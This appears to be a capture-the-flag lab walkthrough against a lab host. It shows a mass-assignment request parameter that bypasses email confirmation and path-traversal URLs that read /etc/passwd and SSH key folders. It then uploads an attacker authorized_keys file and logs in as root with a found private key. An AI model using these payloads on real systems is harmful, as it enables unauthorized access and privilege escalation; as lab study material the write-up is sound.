nmap shows ports 22, 80, 33017 open 3000 closed

gobuster on port 80 reveals a /boolean endpoint, upon visiting, is a login page

It allows us register a new user, whose email needs confirmation
We register with a fake email, and login with that

Once we login, we see "confirm email" and an option to edit email
Fire up burp to inspect the requests. if we just look at it as it passes, we see a field in the response `"confirmed":false,` and the corresponding data in the request `_method=patch&authenticity_token=blahblahblah&user%5Bemail%5D=test%40test.com&commit=Change%20email`
To make this true
So we add `&user%5Bconfirmed%5D=true`, and the patch function becomes
`_method=patch&authenticity_token=blahblahblah&user%5Bconfirmed%5D=true&user%5Bemail%5D=test%40test.com&commit=Change%20email`

Once we forward this, the file manager gets unlocked.
We upload a test file, and once it gets uploaded, we click on it, and the link shows as 
`http://192.168.163.231/?cwd=&file=test&download=true`

Now, for file disclosres, we modify the cwd to `../../../../../etc` `&file=passwd`
We see a user `remi`
change the link to
`http://192.168.163.231/?cwd=../../../../../home/remi/.ssh` for a directory listing, there's a directory `keys`, from which we can download files
`id_rsa, id_rsa.1 id_rsa.2 root`
all of those ask for a password for users remi and root

So the next plan is to setup new ssh and keep the authorized keys in `/home/remi/.ssh`
```zsh
#on kali
mkdir ssh
cd ssh
ssh-keygen -f id_rsa
#eter twice for empty passphrase and confirm passphrase
cat id_rsa.pub > authorized_keys
```
Upload the authorized_keys in remi's .ssh dir

```zsh
ssh remi@IP -i id_rsa
cd .ssh/keys
#shows root's id_rsa
#when we try 
ssh root@localhost -i root
#Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
#Disconnected from 127.0.0.1 port 22
#This is because the ssh agent has too many keys loaded
#To clean this,
ssh-add -D
#now, reattempt root ssh
ssh root@localhost -i root
#OR
ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
```